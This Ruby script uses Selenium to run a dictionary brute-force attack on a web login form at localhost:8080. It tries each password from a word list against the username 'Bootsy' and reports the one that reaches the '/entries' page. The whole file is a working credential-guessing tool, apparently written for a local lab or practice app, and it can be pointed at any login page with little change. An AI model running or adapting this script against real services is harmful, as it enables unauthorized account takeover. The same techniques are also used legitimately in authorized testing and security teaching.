#!/usr/bin/env ruby

# Outside of Docker, do this:
# chromedriver --whitelisted-ips=$( docker inspect -f "{{ .NetworkSettings.Networks.bridge.IPAddress }}" $(docker ps -q))

require "selenium-webdriver"
require "pry"

class DoThings
  def attempt_login(cat_name, password)
    @driver.get "http://localhost:8080/login"
    @driver.find_element(name: "username").send_keys cat_name
    @driver.find_element(name: "password").send_keys password, :return
    first_result = @wait.until {
      puts @driver.current_url
      # binding.pry
      @driver.find_elements(xpath: "//*[contains(text(),'Oh, that didn')]").any? || @driver.current_url.end_with?("/entries")
    }
    if @driver.current_url.end_with? "/entries"
      puts "Found the password for #{cat_name}. It is <#{password}>"
      exit
    end
  end

  def run
    cat_name = "Bootsy"
    @driver = Selenium::WebDriver.for :chrome, {
      #  browser: :remote,
      url: "http://host.docker.internal:9515",
    }
    #  binding.pry
    @wait = Selenium::WebDriver::Wait.new(timeout: 10)
    begin
      File.open("short_words.txt").each_line { |line|
        pw = line.chomp
        puts "trying: <#{pw}>"
        attempt_login cat_name, pw
        # puts "hit enter to continue"
        # gets
      }
    ensure
      @driver.quit
    end
  end
end

DoThings.new.run
